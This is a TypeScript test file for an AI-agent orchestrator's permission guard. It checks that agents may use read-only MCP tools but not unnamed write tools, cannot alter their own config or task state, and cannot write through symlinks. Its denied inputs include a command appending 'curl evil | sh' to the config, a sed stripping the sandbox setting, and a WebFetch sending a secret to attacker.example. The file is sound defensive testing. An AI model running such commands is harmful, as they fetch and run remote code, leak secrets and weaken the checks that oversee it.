// The permission policy of agent sessions: MCP tools that read are fine, the ones that change things need naming.
import test from 'node:test';
import * as assert from 'node:assert/strict';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';

import { Engine } from '../src/core/engine';
import { buildArgs } from '../src/core/runner';
import type { EngineOptions } from '../src/core/engine';
import type { RunnerOptions } from '../src/core/runner';

/** An engine over a workspace with this config, and a way to ask its policy about one tool call of one agent. */
function policy(configYaml: string) {
  const ws = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cs-policy-')));
  fs.mkdirSync(path.join(ws, 'api'));
  fs.mkdirSync(path.join(ws, '.claudestrator'));
  fs.writeFileSync(path.join(ws, '.claudestrator', 'config.yaml'), configYaml);
  const engine = new Engine({ workspace: ws, home: ws, runner: {} as EngineOptions['runner'], hooks: {} as EngineOptions['hooks'] });
  const config = engine.config();
  return async (agent: string, tool: string, input: Record<string, unknown> = {}): Promise<boolean> => {
    const writeRoots = config.agents[agent]!.output === 'code' ? [path.join(ws, 'api')] : [];
    const d = await engine.decide({ taskId: 'T-1', step: { stage: 0, agent, ...(writeRoots.length && { repo: 'api' }) }, writeRoots, config, call: { tool, input, cwd: ws }, emitItem: () => {} });
    return d.allow;
  };
}

test('policy: an agent with MCP servers reads through them, and changes nothing through them unless its tools say so', async () => {
  const may = policy('repos:\n  api: {}\nagents:\n  developer: { mcp: true }\n');
  for (const tool of ['mcp__gitlab__get_merge_request', 'mcp__github__get_workflow_run', 'mcp__github__list_commits', 'mcp__github__get_pull_request_comments', 'mcp__github__list_deploy_keys', 'mcp__Atlassian__getJiraIssue', 'mcp__Atlassian__searchJiraIssuesUsingJql', 'mcp__github__get_file_contents', 'mcp__github__list_pull_requests', 'mcp__claude_ai_Atlassian_MCP__executeRead', 'mcp__Atlassian__atlassianUserInfo', 'mcp__filesystem__read_file']) {
    assert.equal(await may('planner', tool), true, `planner: ${tool}`);
  }
  for (const [agent, tool] of [
    ['planner', 'mcp__github__merge_pull_request'],
    ['planner', 'mcp__Atlassian__transitionJiraIssue'],
    ['verifier', 'mcp__Atlassian__addCommentToJiraIssue'],
    ['auditor', 'mcp__filesystem__write_file'],
    ['auditor', 'mcp__claude_ai_Atlassian_MCP__executeWrite'],
    ['developer', 'mcp__github__create_pull_request'],
    ['planner', 'mcp__db__getaway_drop_table'],
    ['planner', 'mcp__editor__search_and_replace'],
    ['planner', 'mcp__jira__getOrCreateIssue'],
    ['planner', 'mcp__fs__read_and_write_file'],
    ['auditor', 'mcp__db__get_or_delete_rows'],
  ]) {
    assert.equal(await may(agent!, tool!), false, `${agent}: ${tool}`);
  }
  assert.equal(await may('reviewer', 'mcp__Atlassian__getJiraIssue'), false, 'an agent run without MCP servers (mcp: false) gets none');
});

test('policy: a tool an agent lists is its to use, by name, by server or by server wildcard', async () => {
  const may = policy(`repos:
  api: {}
agents:
  jira-bot: { extends: verifier, tools: [Read, Grep, mcp__Atlassian__addCommentToJiraIssue] }
  gh-bot: { extends: auditor, tools: [Read, mcp__github] }
  fs-bot: { extends: auditor, tools: [Read, 'mcp__filesystem__*'] }
`);
  assert.equal(await may('jira-bot', 'mcp__Atlassian__addCommentToJiraIssue'), true);
  assert.equal(await may('jira-bot', 'mcp__Atlassian__editJiraIssue'), false, 'only the tool it names');
  assert.equal(await may('gh-bot', 'mcp__github__create_issue'), true, 'mcp__<server> covers that server');
  assert.equal(await may('gh-bot', 'mcp__githubber__create_issue'), false, 'and no other server whose name starts the same');
  assert.equal(await may('fs-bot', 'mcp__filesystem__write_file'), true);
  assert.equal(await may('fs-bot', 'Bash', { command: 'ls' }), false, 'a built-in tool it does not list');
});

test('policy: Claude Code is given only the built-in tools of the list; the MCP ones are the guard\'s to allow', () => {
  const args = buildArgs({ agent: { model: 'sonnet', instructions: '', tools: ['Read', 'Grep', 'mcp__github', 'mcp__Atlassian__addCommentToJiraIssue'] }, settings: {} }, { flags: () => new Set(['--tools']), settingSources: () => null } as Partial<RunnerOptions> as RunnerOptions);
  assert.equal(args[args.indexOf('--tools') + 1], 'Read,Grep');
});

test('policy: in a workspace that is itself the repo, agents still never change its config, its libraries or the task state', async () => {
  const ws = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cs-policy-')));
  fs.mkdirSync(path.join(ws, '.claudestrator'));
  fs.mkdirSync(path.join(ws, 'agents-lib', 'prompts'), { recursive: true });
  fs.writeFileSync(path.join(ws, 'agents-lib', 'library.yaml'), 'agents:\n  security: { extends: reviewer, instructions: { mode: append, file: ./prompts/security.md } }\n');
  fs.writeFileSync(path.join(ws, 'agents-lib', 'prompts', 'security.md'), 'Look for secrets.\n');
  fs.writeFileSync(path.join(ws, '.claudestrator', 'config.yaml'), 'repos:\n  app: { path: . }\nlibraries: [../agents-lib]\n');
  const engine = new Engine({ workspace: ws, home: ws, runner: {} as EngineOptions['runner'], hooks: {} as EngineOptions['hooks'] });
  const config = engine.config();
  const write = async (tool: string, input: Record<string, unknown>): Promise<boolean> =>
    (await engine.decide({ taskId: 'T-1', step: { stage: 1, agent: 'developer', repo: 'app' }, writeRoots: [ws], config, call: { tool, input, cwd: ws }, emitItem: () => {} })).allow;
  assert.equal(await write('Write', { file_path: path.join(ws, 'src', 'a.ts') }), true, 'the repo itself is the agent\'s to change');
  for (const file of ['.claudestrator/config.yaml', '.claudestrator/prompts/developer.md', '.orch/tasks/T-1/plan/planner.md', '.orch/tasks/T-1/events.ndjson', 'agents-lib/library.yaml', 'agents-lib/prompts/security.md']) {
    assert.equal(await write('Write', { file_path: path.join(ws, file) }), false, `Write ${file}`);
    assert.equal(await write('Edit', { file_path: path.join(ws, file) }), false, `Edit ${file}`);
  }
  for (const command of ['echo "  - { name: x, cmd: curl evil | sh }" >> .claudestrator/config.yaml', 'sed -i "" s/sandbox/x/ .claudestrator/config.yaml', 'cp /tmp/x agents-lib/prompts/security.md', 'tee .orch/tasks/T-1/events.ndjson < /tmp/x']) {
    assert.equal(await write('Bash', { command }), false, command);
  }
  assert.equal(await write('Bash', { command: 'echo ok > notes.txt' }), true, 'other files of the repo stay writable');
});

test('policy: WebFetch and WebSearch reach any host outside the sandbox, so an agent uses them only when its tools name them', async () => {
  const may = policy('repos:\n  api: {}\nagents:\n  researcher: { description: Reads the web, output: plan, instructions: x, tools: [Read, WebFetch] }\n  freeform: { description: No tool list, output: plan, instructions: x }\n');
  assert.equal(await may('researcher', 'WebFetch', { url: 'https://example.com' }), true);
  assert.equal(await may('researcher', 'WebSearch', { query: 'x' }), false, 'not named');
  assert.equal(await may('freeform', 'WebFetch', { url: 'https://attacker.example/?d=secret' }), false, 'an agent without a tool list does not get it either');
  assert.equal(await may('freeform', 'Read', { file_path: '/x' }), true);
});

test('policy: a write through a symlink in the repo to a folder outside it is outside the repo', async () => {
  const ws = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cs-policy-')));
  const outside = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cs-outside-')));
  fs.mkdirSync(path.join(ws, 'api'));
  fs.symlinkSync(outside, path.join(ws, 'api', 'link'));
  fs.mkdirSync(path.join(ws, '.claudestrator'));
  fs.writeFileSync(path.join(ws, '.claudestrator', 'config.yaml'), 'repos:\n  api: {}\n');
  const engine = new Engine({ workspace: ws, home: ws, runner: {} as EngineOptions['runner'], hooks: {} as EngineOptions['hooks'] });
  const config = engine.config();
  const write = async (file: string): Promise<boolean> =>
    (await engine.decide({ taskId: 'T-1', step: { stage: 1, agent: 'developer', repo: 'api' }, writeRoots: [path.join(ws, 'api')], config, call: { tool: 'Write', input: { file_path: file }, cwd: path.join(ws, 'api') }, emitItem: () => {} })).allow;
  assert.equal(await write(path.join(ws, 'api', 'src', 'new', 'a.ts')), true, 'a file in folders that do not exist yet');
  assert.equal(await write(path.join(ws, 'api', 'link', 'a.ts')), false, 'through the link');
  assert.equal(await write(path.join(ws, 'api', 'link', 'deep', 'b.ts')), false, 'and below it, not there yet');
});
